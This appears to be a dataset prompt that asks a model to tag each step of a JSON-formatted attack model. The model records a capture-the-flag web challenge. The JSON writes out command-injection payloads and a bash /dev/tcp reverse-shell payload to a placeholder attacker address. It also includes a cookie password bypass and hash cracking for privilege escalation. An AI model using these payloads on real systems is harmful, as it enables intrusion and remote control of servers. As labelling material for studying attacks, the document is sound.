@@ -1,0 +1,139 @@
+Given this attack model, you have to add for each step the following information:
+- The "Taxon" field picking one from the following list : [Planning and Preparation, Information Gathering, Vulnerability Analysis, Exploitation, Post-Exploitation]. The Taxon must be the first field of the step.
+
+Just reply with the enhanched json between backticks without further info.
+
+Here's the model:
+
+{
+    "AttackModel": {
+        "AttackerCapabilities": [
+            "Web application penetration testing",
+            "Exploiting code injection vulnerabilities",
+            "Privilege escalation",
+            "Bruteforcing password hashes",
+            "Lateral movement within a compromised system"
+        ],
+        "Target": {
+            "Type": "Web Application",
+            "Vulnerabilities": [
+                "Code injection vulnerability in the 'wc.php' script",
+                "Inadequate access control on the 'flag.txt' file"
+            ],
+            "SecurityMeasures": [
+                "Password-based access control using a 'password' cookie",
+                "Limited execution time for PHP scripts"
+            ]
+        },
+        "Steps": [
+            {
+                "StepNumber": 1,
+                "Description": "The attacker starts by accessing the web application, but they are blocked by a password-based access control mechanism.",
+                "ToolsUsed": null,
+                "StepDetails": {
+                    "Hypothesis": "Bypass the password check to gain access to the application.",
+                    "Action": "Set the 'password' cookie to 'w0rdc0unt123', bypassing the access control check.",
+                    "Result": "Successfully bypasses the password check and gains access to the application.",
+                    "Success": "Success",
+                    "FailingReason": null
+                }
+            },
+            {
+                "StepNumber": 2,
+                "Description": "The attacker identifies a code injection vulnerability in the 'wc.php' script that allows them to execute arbitrary commands.",
+                "ToolsUsed": null,
+                "StepDetails": {
+                    "Hypothesis": "Exploit the code injection vulnerability to execute arbitrary commands on the server.",
+                    "Action": "Craft a payload '; ls #', which lists files in the current directory.",
+                    "Result": "Successfully lists files in the current directory, revealing 'wc.php', 'checkpass.php', and 'robots.txt'.",
+                    "Success": "Success",
+                    "FailingReason": null
+                }
+            },
+            {
+                "StepNumber": 3,
+                "Description": "The attacker realizes that the code injection vulnerability only returns the last line of the command output.",
+                "ToolsUsed": null,
+                "StepDetails": {
+                    "Hypothesis": "Modify the payload to capture the full command output by replacing new-lines with spaces.",
+                    "Action": "Update the payload to '; <command> | tr '\\n' '' #'.",
+                    "Result": "Successfully captures the full command output without line breaks.",
+                    "Success": "Success",
+                    "FailingReason": null
+                }
+            },
+            {
+                "StepNumber": 4,
+                "Description": "The attacker decides to exploit the code injection to establish a reverse shell connection to their server for easier navigation.",
+                "ToolsUsed": null,
+                "StepDetails": {
+                    "Hypothesis": "Use the code injection to execute a reverse shell command and connect back to the attacker's server.",
+                    "Action": "Craft a payload '; bash -c \"bash -i >& /dev/tcp/your.server.ip.address/8000 0>&1\" #', replacing 'your.server.ip.address' with the attacker's IP.",
+                    "Result": "Successfully establishes a reverse shell connection to the attacker's server.",
+                    "Success": "Success",
+                    "FailingReason": null
+                }
+            },
+            {
+                "StepNumber": 5,
+                "Description": "With a reverse shell on the server, the attacker explores the filesystem and identifies a directory '/ctf' containing potentially interesting files.",
+                "ToolsUsed": null,
+                "StepDetails": {
+                    "Hypothesis": "Navigate through the server's filesystem to find valuable information.",
+                    "Action": "List files and directories to discover the '/ctf' directory.",
+                    "Result": "Successfully identifies the '/ctf' directory.",
+                    "Success": "Success",
+                    "FailingReason": null
+                }
+            },
+            {
+                "StepNumber": 6,
+                "Description": "The attacker locates a script named 'findaas' in the '/ctf' directory, which can be used to find the 'flag.txt' file.",
+                "ToolsUsed": null,
+                "StepDetails": {
+                    "Hypothesis": "Use the 'findaas' script or a direct 'find' command to locate the 'flag.txt' file.",
+                    "Action": "Execute './findaas flag.txt' to find the 'flag.txt' file.",
+                    "Result": "Successfully identifies the path of 'flag.txt': './system/of/a/down/flag.txt'.",
+                    "Success": "Success",
+                    "FailingReason": null
+                }
+            },
+            {
+                "StepNumber": 7,
+                "Description": "The attacker attempts to read the 'flag.txt' file but encounters a permission denied error.",
+                "ToolsUsed": null,
+                "StepDetails": {
+                    "Hypothesis": "Read the 'flag.txt' file to obtain the flag.",
+                    "Action": "Try to 'cat' the 'flag.txt' file.",
+                    "Result": "Encounters a 'Permission denied' error.",
+                    "Success": "Failed",
+                    "FailingReason": "Lacks permission to read the file."
+                }
+            },
+            {
+                "StepNumber": 8,
+                "Description": "The attacker leverages the discovered password hash ('6f246c872cbf0b7fd7530b7aa235e67e') to perform a brute force attack and obtain the password ('csictf').",
+                "ToolsUsed": null,
+                "StepDetails": {
+                    "Hypothesis": "Brute force the password hash to obtain the password 'csictf'.",
+                    "Action": "Use offline tools or online services to crack the hash and retrieve the password 'csictf'.",
+                    "Result": "Successfully cracks the password hash and obtains 'csictf'.",
+                    "Success": "Success",
+                    "FailingReason": null
+                }
+            },
+            {
+                "StepNumber": 9,
+                "Description": "The attacker switches to the 'ctf' user using the cracked password and reads the 'flag.txt' file to obtain the flag.",
+                "ToolsUsed": null,
+                "StepDetails": {
+                    "Hypothesis": "Switch to the 'ctf' user and access the 'flag.txt' file.",
+                    "Action": "Use the cracked password 'csictf' to switch to the 'ctf' user and 'cat' the 'flag.txt' file.",
+                    "Result": "Successfully switches to the 'ctf' user and obtains the flag 'csictf{1nj3ct10n_15_p41nfu1}'.",
+                    "Success": "Success",
+                    "FailingReason": null
+                }
+            }
+        ]
+    }
+}
